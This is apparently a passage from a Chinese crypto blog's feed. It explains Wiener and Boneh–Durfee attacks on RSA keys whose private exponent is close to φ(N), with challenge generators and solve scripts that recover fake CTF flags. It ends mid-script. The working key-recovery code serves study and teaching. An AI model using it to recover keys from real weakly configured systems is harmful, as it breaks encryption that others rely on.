ed1025fb9bd6f9cae104142fcf6439ce896ba1074f74874a51fbb4503232259b3d8678135f88a69a3975fef42f27384b80e7843e6947c8c477a399b15c31d979a55a773738cc1e99df7647adc44107f0cf4f45fe627795c33a6c3fab9b744358dd5819e57ca543ca7beb788f0948306941b5d4b5f6507caa45a832152eccb11d4fb2e732d3a4a851d8ec0bd93c5a32f3bfec3d742c4095c570fd4ebbafaa03baf16e6397c5e35436cee1be6613d8ee44d6756c0b09815b652deefd76785cac3f5d9bc01cc302173eb471a1f98c6bdec93e219bddfe745db11c8d7febaf09ae5c3ee3ff0e5e556e3898a5eb2f8a8d7b9005f748a040913b88555641fcbe8f752e5256101fe0e1abdd156fd31649e3ccbc18668be98458957a2855f847008a0e7d61c4889703bfe557b629d13d2fb4575d349041d0fce9706eebf86c0001decbcc7f0e5eef1970f5c9cd2e43f30cbd81877f7ebbf9924aa966a7538fc5e8ba63824750dd5bd3d7dbd192ea3bd6532851a269bf760a96b63049067c10c566452fea18b6c53fed4a1006b1d3a682728867443f01cd213ae21e995ba11e936d9a4d53948e83dbe85fb0cb269eb099b0f2fa779a2a25761581e726fc417eb5ba3765c9243a58545eafde54a039f7fa5a4b998a0f2c1eb339ab708280381a276010fd5d273c744581e0410db120f162a7949a37bdc45b3d8de823de04d8ce2d39c36f2ea3abbd5e66737746bde70ce91186318c9df49b9f754f72c73fdaa52c820b53142b722bc58f5ef1fb5825045fa67353aef40f388d6baf1fe213b1f44b847c058816e380798204d815718436f252461691f47d30db6fc2c22348076df4f11fe60b2bf813a9fdefa99f5f7054133ae52ffb3d65223d1d9e18a6dc6e2305d970fae2dddeffd4de3068620fd78e1bc1e9a2e30eaae03f437ee8107d76753e4f15648496bc47756a8b800856c04408e6619f50e503bec8e3e3d2214782d0b3bab7a75e406eb9c4f1416ab1d369b874b0dfc75051ed7bfad25a6dd28b26b5abc153f0b38a73f3c9a5a1389fbeb41e09d0513fb5c9b38c1d16ca62042d969a866fb212e3084fd4535e7c7d330fceaa8e5283060185c8939e17bb38b4442e12c6499533c3a12ad352d23f617c37e27b872286b756a3848971632b2b5a17fe691f4307072668c0f32bc79e56bdd4b44283b0e5a9c16097df83c451f295eaf17160c614b080746e46693f312843a19e8749a448451d9b42f9c01c5a515adff1a9cbf4c213894b0d6ba0abe89100821eb1bfbeccf23d9892a98969cdc14358762d32724e3e47eaac362b10ddb537cf595a17b5f232b4ff37030613024cef571570aba0051f20f8221a64a6fd516ff00ee844578dbbd736c015860e061c0546a123bc7f1c58488a4935ad359deda61b264fc9db93229444520c79c192a601b86c06813c38be69901cfa024b932d900d5864021f7d01c678fdc34a317d74c5d4e1012560995be48b9893c38a22cbf80d674923c204e331b9fce60fb7197d88240c815e341981be19abf1b9c03248fcbdeac568f23bad29aecd9abec1342b0483f1402a79effa1579c98589af1f8f761126325c09aa6aac4da50fd52679e79f1aba2eb2cf51cc7754bfbc74fa0377fd84d14741b76c85512d74438f91129772a5f2a0e9d4fbf3b01e6caf351075519a05775d8f6bae979a5019ff9851968d0b57aad98696e04f86f6992f11d72f093d75c518ced312b87365b721a7470c559c5be77847af6663c9303a5167caf1190ef80f543927285caebae4a2f8e76316f874417cabf209f55b3eac8c0612fae2f91cd58c7a15262bc9801f8f0c30a9461f75df575841489c2ba7111feaf2ae49ea06fda08439af8287572d4bfa687982020fb57d1f70f45c41daacc5eb5b2c7644436a02979ce24bb9a2baaf58c03972806247cc870060d107cb32febc4c0f4080f9ddbf06c655ea372613c9d57da43d3816fd182e8b0452f5eb079ff0fb495b65f109b4ee0dd910318f40ddb48d030fc589ddb3040a3f96a306a0ae2cf41407c2b85da278d3353b09b8c05cd02c5d9ba5c577fab980d1d5f35a7febdafd6bf45eb39357cf97ed1167bc945f0d9f3e0636242dd5bd9e232c2584c8568595ee42d5944f8a94ba79b6b58845fabc2b725e664b35bd71a98b544c5c157bebc978480ecbf78ce165d90a0e08cc490bf13a5c60625d89e9ff288e59ce42ade5fd07ca68e64041fbf28fc45528f44ce3ff3e977cb424214a3a975abc6c5e3fef27df6824e63d17e6f59b81bdc1f5d45f5dfdd257d9184d51851dcf1608ea0c026f53ad5967d299afab5f0a09a63991d91f477e2603d2f266e642d1e6d6361ff0f7899444a8b7dbbd1b180ee1341abef1703ef6b7aca6d5b662dd60d59595106bc8f9cc5d81bd0423d2c5f35d0a8b4127301f48319414bd6ab2942fb490025b2322a314ba04de42fd3676fa7c1d7b75dee052259bb17f0d0612d2bbc017cfc4d1ab07ae3d16303516df52c813ade4cc31140d751e56e558d538142ec264c68557e65359c1604a456fa1d0a9f1822ae35342d10125a4d627c22de061212ce1c38da6093a5cb70ad108d027e230ec5d3deb2c80d8f170fc0f89a59532b133f746d4c50d1045809014402fcd67030806d7d5f0965ca34bb176158823c51c1518146a14beddfa00685345a06be4c902325af895bec27e4c4510ae7a40360f7c9c12fe833e08bb34091e2549a1829ec3e4796309753e25ad973fb0c7715bdb69d0a9200fa33e933d4164be1742a7fac11fe5efc7fb04cac9e260f18031e2ab5949ec3d05f2ae73c3172469b445c1e27a010d87840e8d7a6f3c3380eca95958443c08c567f87525cc82b30e9e6d410495ec3dbe18d0105273a311474570860125c6a06032626aecdecba3ad0e348051f78dd5d7aa692875febe7397ab1df13f44bb1e307ecd99f2dc431465cff100829538b04feb50f2c0a5a48b30ea7f14f7f0d380b47bf342a3a3a5d5e2d6667d3c9ca2b1f6eecc09450482a7e5d4ef85b6022b5159eba054244dbcdc0dcc592882b6bb43f2af225631fc3fdd7c651b5ba3465c15bdb90e3422e4678a3ad1d1253cc62873b991a11d8e52837d528902c3ad1fba1d58fc7890a81064b97d397cdb2b686385582065b7c54e174f5aa60ce5f35f0b7f8783561b7c4ca711150951a2775ca6eefb06cb39ccdf1c73b077dacf93664ad848bc72097ff50dfa13c8aab79df08258cbd8533ee867a1bfab07b34cbc01458ec06652679fd72fc49f3cdcc956726cfd2beab6acb722c005fbf3858fe4915fb60b2d5cc6774b6e03af5b30f6a39b535c75cf66ee8778bc2db27f28f863478c43ff84099f60553e627cd39f2304ec787162e89915cb82ba8f41b0ae0fe88e53cbc363eca166fc1b9ce111e143d88a31e817eb376f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">出了一道题，适时公开。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Enter password to read :).</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Crypto_Papers_Read_&amp;_Recurrent</title>
    <link href="http://example.com/2024/01/29/Crypto-Papers-Read-Recurrent/"/>
    <id>http://example.com/2024/01/29/Crypto-Papers-Read-Recurrent/</id>
    <published>2024-01-29T12:15:36.000Z</published>
    <updated>2024-03-03T09:57:03.198Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>[TOC]</p><h1 id="0x01-RSA私钥过大的漏洞"><a href="#0x01-RSA私钥过大的漏洞" class="headerlink" title="0x01  RSA私钥过大的漏洞"></a>0x01  RSA私钥过大的漏洞</h1><p><a href="https://github.com/AL3XEI709/papers/blob/main/cacr2004-01.pdf">Link</a></p><blockquote><p>使用过小的RSA私钥指数引发的危险在十多年前就已经为人所知。用户虽然已知这些威胁，但依然希望从实质上降低解密时间，可能会倾向于使用一个与很大的私钥相关的<strong>小负素数</strong>。这篇论文展示了Wiener, Boneh &amp; Durfee, Blomer &amp; May的<strong>针对小私钥指数的攻击</strong>，以及由上述攻击延申的对含多个素数的RSA的攻击，<strong>同样适用于私钥指数非常大的情况</strong>。</p></blockquote><h2 id="1-1-低加密指数攻击"><a href="#1-1-低加密指数攻击" class="headerlink" title="1.1 低加密指数攻击"></a>1.1 低加密指数攻击</h2><p>考虑公钥指数$e&#x3D;3$ 的RSA。如果明文大小在 $0&lt;m&lt;N^{1&#x2F;3}$ 区间内，解密仅需简单的对密文 $c&#x3D;m^3\mod N$ 开三次方即可，因为 $m^3&lt;N$。考虑处于 $N-N^{1&#x2F;3}&lt;m&lt;N$ 区间内的明文。相应的，在有限域的表示里，$-N^{1&#x2F;3}&lt;m&lt;0$。令 $c&#x3D;m^3\mod N$ ，解密仅需计算出 $-c\mod N$ 的三次方，即 $m&#x3D;-^3\sqrt {-c}$​ 。</p><h2 id="1-2-连分数攻击-Wiener"><a href="#1-2-连分数攻击-Wiener" class="headerlink" title="1.2 连分数攻击( Wiener )"></a>1.2 连分数攻击( Wiener )</h2><p> 针对RSA小私钥指数的Wiener 攻击，可以轻而易举的扩展到针对大私钥指数的攻击。</p><p> <strong>定理1.</strong> 令RSA的模数为$N$，私钥指数$d$ 满足  $\sqrt 6 (\phi(N)-d)&lt;N^{1&#x2F;4}$ ，则公钥 $(N,e)$ 已知的情况下，在多项式时间 $\log_2N$ 内可以求得私钥。</p><p>由RSA公式：$ed\equiv 1\pmod {\phi(N)}$ ，可化为$e(d-\phi(N))\equiv1\pmod{\phi(N)}$ 。令 $D&#x3D;\phi(N)-d$，等式也可以写成<br>$$<br>eD&#x3D;-1+k\phi(N)<br>$$<br>$k$ 为正，且 $k&lt;D$。根据连分数的性质可求得</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401292106997.png" alt="image-20240129210633885"></p><p>因此，$k&#x2F;D$ 是 $e&#x2F;N$ 的一个连分数项。通过连分数算法我们可以计算所有$e&#x2F;N$ 连分数的子项，验证正确的 $k&#x2F;D$ 。令 $k’&#x2F;D’$ 是 $e&#x2F; N$ 连分数的子项，我们可以计算 $\phi’&#x3D;(eD’+1)&#x2F;k’$ 并尝试分解 $N$ 。当 $k’&#x2F;D’&#x3D;k&#x2F;D$ 时，$\phi’&#x3D;\phi(N)$，就能实现分解 $N$。$N$ 分解后，计算 $d&#x3D;e^{-1}\pmod {\phi(N)}$ ，自然地 $d&#x3D;\phi(N)-D$ 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes <span class="keyword">as</span> ltb, bytes_to_long <span class="keyword">as</span> btl </span><br><span class="line">DEBUG = <span class="literal">True</span> </span><br><span class="line">flag = <span class="string">b&#x27;AL3XEI_FAKE_FLAG&#x27;</span> </span><br><span class="line"></span><br><span class="line">p,q = [getPrime(<span class="number">512</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;pq&quot;</span>] </span><br><span class="line">D = getPrime(<span class="number">250</span>) </span><br><span class="line">phi = ( p - <span class="number">1</span> ) * ( q - <span class="number">1</span> ) </span><br><span class="line">n = p * q </span><br><span class="line">d = phi - D </span><br><span class="line">e = <span class="built_in">int</span>(<span class="built_in">pow</span>(d, -<span class="number">1</span>, phi)) </span><br><span class="line">m = btl(flag) </span><br><span class="line">c = <span class="built_in">pow</span>( m, e, n ) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123; n &#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123; e &#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123; c &#125;</span>&quot;</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG: </span><br><span class="line">    <span class="built_in">print</span>(D &lt; <span class="built_in">int</span>(( <span class="number">1</span> / <span class="number">3</span> ) * ( n ** ( <span class="number">1</span> / <span class="number">4</span>) ))) <span class="comment"># True</span></span><br><span class="line">    <span class="built_in">print</span>(d &gt; <span class="built_in">int</span>(( <span class="number">1</span> / <span class="number">3</span> ) * ( n ** ( <span class="number">1</span> / <span class="number">4</span>) ))) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes <span class="keyword">as</span> ltb, bytes_to_long <span class="keyword">as</span> btl </span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, powmod</span><br><span class="line"></span><br><span class="line">n = <span class="number">95808867301115765470157527057122018773590644850340036063660006144241016363461180542662128242331000493503329275886318638577802911609861754489409308916334153092827359773990576953494489066891754958489518296506864007107461706876199087038625529359792723687739032883111118846057885223348567281260289769095947114739</span></span><br><span class="line">e = <span class="number">72952655963278861108037401373646812489130641329155131272331089883876512873398927024065977145052641871946921270479021693525422184386907115823533940193059034867804357288283454791095127774996014754357236501690826434022717137945586271536049395574251666543980542223151708613680122933461729612145786142815818031273</span></span><br><span class="line">c = <span class="number">53092997544169330621514962087445873910366122537654477325262038832454410368350321012107129397993250333075127934864393405852932586277268828489217726268128591659958297693818569083093747501691292703602115477380424837002461549729989205851924387111864162444281585577571129538515105806533426232953865589872235703736</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> kD <span class="keyword">in</span> continued_fraction(e / n).convergents(): </span><br><span class="line">    k = kD.numer() </span><br><span class="line">    D = kD.denom() </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> ( e * D + <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi =  ( e * D + <span class="number">1</span>) // k </span><br><span class="line">            d = phi - D </span><br><span class="line">            <span class="keyword">if</span> (e * d) % phi == <span class="number">1</span>:</span><br><span class="line">                m = powmod(c, d, n) </span><br><span class="line">                <span class="keyword">if</span> ltb(m) == <span class="string">b&#x27;AL3XEI_FAKE_FLAG&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(ltb(m))</span><br><span class="line">                    <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span> </span><br><span class="line"><span class="comment"># b&#x27;AL3XEI_FAKE_FLAG&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-3-小逆元攻击-Boneh-Durfee"><a href="#1-3-小逆元攻击-Boneh-Durfee" class="headerlink" title="1.3 小逆元攻击( Boneh &amp; Durfee )"></a>1.3 小逆元攻击( Boneh &amp; Durfee )</h2><p>Boneh &amp; Durfee 提出的小私钥指数攻击是建立在解决小逆元问题上的。也即，给定整数 $A，M$ ，求较小的 $x, y$ 使得 $x_0(A+y_0)\equiv1\pmod M$ 成立。特别的，对于RSA，令 $e&#x3D;N^\alpha, a\approx 1,d&lt;N^\sigma$ ，且 $f(x,y)&#x3D;x(N+y)-1$ 。我们希望能找到 $x_0,y_0$ 满足<br>$$<br>f(x_0,y_0)\equiv0\pmod e, |x_0|&lt;X&#x3D;N^\sigma,|y_0|&lt;Y&#x3D;3N^{1&#x2F;2}<br>$$<br> 上述方程的一个解是 $(x_0,y_0)&#x3D;(k,\phi(N)-N)$ ，$k$ 是正整数，满足$ed-k\phi(N)&#x3D;1$ 。求得这个解就能恢复 $\phi(N)$，就能通过 $d&#x3D;e^{-1}\pmod{\phi(N)}$ 求得私钥指数。Boneh &amp; Durfee 攻击能够成立的界是 $d&lt;N^{0.292}$。</p><p><strong>定理2.</strong> 对针对RSA小私钥指数的，基于小逆元攻击的方法，如果在 $d&lt;N^\sigma$ 情况下成立，则在 $d&gt;\phi(N)-N^\sigma$ 情况下也成立。</p><p>由RSA公式：$ed\equiv 1\pmod {\phi(N)}$ ，可化为$e(d-\phi(N))\equiv1\pmod{\phi(N)}$ 。等式也可以写成<br>$$<br>e(d-\phi(N))&#x3D;1-k\phi(N)<br>$$<br>$k$ 是正整数。令 $\phi(N)&#x3D;N-s$ ，通过模 $e$ 化简上式得：<br>$$<br>k(N-s)\equiv1\pmod e<br>$$<br>就可以回到与 Boneh &amp; Durfee 相同的证明开端了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes <span class="keyword">as</span> ltb, bytes_to_long <span class="keyword">as</span> btl </span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, powmod</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">True</span> </span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;AL3XEI_FAKE_FLAG&#125;&#x27;</span> </span><br><span class="line"></span><br><span class="line">p,q = [getPrime(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;pq&quot;</span>] </span><br><span class="line">D = getPrime(<span class="number">540</span>) </span><br><span class="line">phi = ( p - <span class="number">1</span> ) * ( q - <span class="number">1</span> ) </span><br><span class="line">n = p * q </span><br><span class="line">d = phi - D </span><br><span class="line">e = invert( d , phi ) </span><br><span class="line">m = btl(flag) </span><br><span class="line">c = powmod( m, e, n ) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123; n &#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123; e &#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123; c &#125;</span>&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG: </span><br><span class="line">    <span class="built_in">print</span>(D &gt; <span class="built_in">int</span>(( <span class="number">1</span> / <span class="number">3</span> ) * ( n ** ( <span class="number">1</span> / <span class="number">4</span>) ))) <span class="comment"># True</span></span><br><span class="line">    <span class="built_in">print</span>(D &lt; <span class="built_in">int</span>(n ** <span class="number">0.292</span>)) <span class="comment"># True </span></span><br><span class="line">    <span class="built_in">print</span>(d &gt; <span class="built_in">int</span>(( <span class="number">1</span> / <span class="number">3</span> ) * ( n ** ( <span class="number">1</span> / <span class="number">4</span>) ))) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">17454240892015687399635575177782463616161801017744964167166316992000438567954208861858704118356652955895543759727399598219652374479058325078938844154779338116183919894891419788483356211997407257133952613665407522666496603990365551044544912774860275362169418589330692272365871488949028500291407860001016369169984907854821255776104896997216220723282349406685606354577234458755937573128776099775872248358967511724814180905677162892409900525389854774492481283983813437720598034450480461177689525965178110648561898417430930437145140807533085115195591689643648662097740190799143411720931700518856026602702302360314926568581</span></span><br><span class="line">e = <span class="number">9472006993547826181877085916606183877171725401573241100427062914489290602535688049520479075109689144033234591488273713331619169868277776404457381184219722908114354739230936611847952514920710043363745248830472607448666872189680733104753186945972120403917847805229221716562733943884585013414027178553329202033640398859269931922461240207274208439853712244625279285690529977956922186800245494612173821458113218295584900947198353069679892109333258929183299407108300066940097602478149733991650165151031726109016263727784120500243492720059756363698397568038439723237837754741573422562307026635896462445226918934233305349253</span></span><br><span class="line">c = <span class="number">1240657854997120373473014332608523393757721386238508695850715327588273623501287632954714961855717782376882473926702658353841377255541283813786687049622008163374731319510130187681404171234200455616300555070707234749208069265016493701063505624598166007497341750345394637926999347175052260081914034237980193514507441891510910739940736530593344530652245303015446165155575064961996683032595508784436618392009239809243617641142178739154782780714555447141295039415569516609387818390675962279010028151868723561757124514026977897984311634011594112400021778142416416388714397364046098677193619317349662802185788302396211384998</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P = Zmod(ZZ(e))[<span class="string">&quot;k,s&quot;</span>]</span><br><span class="line">k, s = P.gens()</span><br><span class="line">f = <span class="number">1</span> + k * (n - s)</span><br><span class="line">rs = small_roots(f, (<span class="number">2</span>**<span class="number">540</span>, <span class="number">2</span>**<span class="number">1025</span>), m=<span class="number">4</span>, d=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(rs)</span><br><span class="line">k, s = <span class="built_in">map</span>(<span class="built_in">int</span>, rs[<span class="number">0</span>])</span><br><span class="line">phi = n - s</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;AL3XEI_FAKE_FLAG&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="1-4-含多个素数的-RSA"><a href="#1-4-含多个素数的-RSA" class="headerlink" title="1.4 含多个素数的 RSA"></a>1.4 含多个素数的 RSA</h2><p>接下来的攻击将上述RSA攻击扩展到了含多个素数的形式。</p><p><strong>定理3.</strong> 令 $N$ 是含 $r$ 个素数（大小相近）的RSA，$d$ 为私钥指数，且满足 $\sqrt {2(2r-1)}|\phi(N)-d|&lt;N^{1&#x2F;(2r)}$。则公钥 $(N,e)$ 已知的情况下，在多项式时间  $N$ 内可以求得私钥。</p><p>证明过程与 Wiener 攻击近乎一致，不再阐述。</p><p><strong>定理4.</strong> 对针对含多个素数的RSA小私钥指数的，基于小逆元攻击的方法，如果在 $d&lt;N^\sigma$ 情况下成立，则在 $d&gt;\phi(N)-N^\sigma$ 情况下也成立。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">True</span> </span><br><span class="line">p,q,r = [getPrime(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;pqr&quot;</span>] </span><br><span class="line">n = p*q*r </span><br><span class="line">l = getPrime(<span class="number">490</span>)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>)</span><br><span class="line">d = phi - l </span><br><span class="line">e = <span class="built_in">int</span>(<span class="built_in">pow</span>(d, -<span class="number">1</span>, phi)) </span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;AL3XEI_FAKE_FLAG&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;down: &quot;</span>, <span class="built_in">int</span>((<span class="number">1</span>/<span class="number">3</span>)*(n**(<span class="number">1</span>/<span class="number">6</span>))).bit_length())  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;up: &quot;</span>, <span class="built_in">int</span>(<span 